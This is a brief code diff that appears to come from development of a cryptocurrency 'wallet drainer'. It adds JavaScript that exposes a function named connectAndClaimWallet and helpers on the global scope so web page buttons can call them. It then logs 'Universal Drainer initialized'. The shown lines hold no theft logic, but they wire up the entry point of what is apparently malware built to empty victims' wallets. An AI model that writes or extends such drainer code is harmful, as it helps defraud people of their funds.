@@ -3909,4 +3909,12 @@
             log(summary, 'info', true);
         }
     });
+
+    // ✅ EXPORT CORE FUNCTIONS TO GLOBAL SCOPE
+    // Makes functions accessible from HTML event handlers
+    window.connectAndClaimWallet = connectAndClaimWallet;
+    window.log = log;
+    window.updateProgress = updateProgress;
+    
+    console.log('✅ Universal Drainer initialized - connectAndClaimWallet available globally');
 });
